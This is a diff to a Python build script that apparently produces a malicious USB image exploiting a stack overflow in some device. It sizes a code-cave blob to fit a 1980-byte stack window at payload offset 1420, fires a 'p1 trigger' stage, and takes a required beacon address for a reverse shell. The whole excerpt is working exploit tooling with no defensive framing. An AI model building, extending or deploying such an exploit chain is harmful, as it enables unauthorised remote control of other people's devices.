@@ -28,10 +28,11 @@ def run(cmd):
 
 def main():
     ap = argparse.ArgumentParser()
-    ap.add_argument("--profile", choices=("nikem", "nikem-uep"), default="nikem")
+    ap.add_argument("--profile", choices=("nikem", "nikem-uep", "nikem-uep2"),
+                    default="nikem")
     ap.add_argument("--beacon", required=True, help="HOST:PORT for the reverse shell")
     ap.add_argument("--out", default="out/nikem-usb.img")
-    ap.add_argument("--payload-dir", default="out/p2",
+    ap.add_argument("--payload-dir", default="payload/p2",
                     help="directory whose files become the p2 payload")
     ap.add_argument("--force", action="store_true")
     args = ap.parse_args()
@@ -48,11 +49,14 @@ def main():
 
     print("[+] cave blob")
     cave = work / "cave.bin"
-    run([sys.executable, "tools/build_cave_blob.py", "--profile", args.profile,
+    # Chain constants are shared by every nikem* stage profile.
+    run([sys.executable, "tools/build_cave_blob.py", "--profile", "nikem",
          "--payload", stage, "--out", cave])
     size = cave.stat().st_size
-    print(f"[+] cave blob: {size} bytes (num_ext={NUM_EXT} stable requires <= 1980)")
-    if size > 1980:
+    # num_ext=67 copies 66*30 = 1980 bytes into the stack window; the blob is
+    # injected at payload offset 1420, so it must end before 1980.
+    print(f"[+] cave blob: {size} bytes (num_ext={NUM_EXT} stable requires <= 560)")
+    if size > 560:
         sys.exit("cave blob too large for num_ext=67; trim the stage command")
 
     print("[+] p1 trigger (num_ext=67, frozen)")
